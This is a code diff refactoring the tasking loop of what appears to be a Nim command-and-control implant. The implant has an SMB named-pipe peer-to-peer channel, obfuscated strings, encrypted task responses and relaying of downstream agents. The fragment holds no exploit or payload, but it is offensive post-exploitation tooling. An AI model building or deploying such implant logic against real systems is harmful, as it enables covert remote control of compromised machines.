@@ -752,15 +752,14 @@ proc start*(profile: SmbProfile) =
               elif action == obf("get_tasking"):
                 debug "[DEBUG] SMB P2P: Received get_tasking response with tasks"
                 
-                if msgJson.hasKey(obf("tasks")):
+                if msgJson.hasKey(obf("tasks")) and msgJson[obf("tasks")].len > 0:
                   let tasks = msgJson[obf("tasks")]
-                  if tasks.len > 0:
-                    debug "[DEBUG] SMB P2P: Received ", tasks.len, " task(s) to execute"
-                    
-                    var taskResponses = newJArray()
-                    var shouldExit = false
-                    
-                    for task in tasks:
+                  debug "[DEBUG] SMB P2P: Received ", tasks.len, " task(s) to execute"
+                  
+                  var taskResponses = newJArray()
+                  var shouldExit = false
+                  
+                  for task in tasks:
                       let taskId = task[obf("id")].getStr()
                       let command = task[obf("command")].getStr()
                       
@@ -895,30 +894,30 @@ proc start*(profile: SmbProfile) =
                       
                       else:
                         taskResponses.add(execResult.response)
-                    
-                    # Collect downstream delegate data (multi-level P2P)
-                    let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb()
-                    for e in taskEdges:
-                      taskResponses.add(e)
-                    
-                    # Send response
-                    let taskingResponse = %* {
-                      obf("action"): obf("post_response"),
-                      obf("responses"): taskResponses
-                    }
-                    if taskDelegates.len > 0:
-                      taskingResponse[obf("delegates")] = taskDelegates
-                      debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
-                    
-                    debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
-                    let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
-                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
-                    
-                    if shouldExit:
-                      debug "[DEBUG] SMB P2P: Exit command sent, waiting for delivery before shutdown"
-                      sleep(500)
-                      clientShouldExit = true
-                      break
+                  
+                  # Collect downstream delegate data (multi-level P2P)
+                  let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb()
+                  for e in taskEdges:
+                    taskResponses.add(e)
+                  
+                  # Send response
+                  let taskingResponse = %* {
+                    obf("action"): obf("post_response"),
+                    obf("responses"): taskResponses
+                  }
+                  if taskDelegates.len > 0:
+                    taskingResponse[obf("delegates")] = taskDelegates
+                    debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
+                  
+                  debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
+                  let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
+                  discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+                  
+                  if shouldExit:
+                    debug "[DEBUG] SMB P2P: Exit command sent, waiting for delivery before shutdown"
+                    sleep(500)
+                    clientShouldExit = true
+                    break
                 else:
                   debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
                   # Even without tasks, check for downstream delegate data to relay
